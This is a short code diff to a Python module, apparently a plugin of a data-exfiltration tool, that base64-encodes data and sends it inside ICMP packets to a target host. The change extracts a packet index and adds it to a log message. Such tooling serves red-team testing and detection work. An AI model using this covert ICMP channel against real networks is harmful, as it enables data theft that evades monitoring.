@@ -1,5 +1,6 @@
 import base64
 import socket
+import sys
 from random import choice, randint
 from dpkt import ip, icmp
 
@@ -33,9 +34,10 @@ def send(data):
         target = choice(targets)
     else:
         target = config['target']
+    packet_index = data.split('|!|')[1]
     data = base64.b64encode(data)
     app_exfiltrate.log_message(
-        'info', "[icmp] Sending {0} bytes with ICMP packet to {1}".format(len(data), target))
+        'info', "[icmp] Sending {0} bytes with ICMP packet to {1}. PacketIndex = {2}".format(len(data), target, packet_index))
     send_icmp(target, data)
 
 def listen():
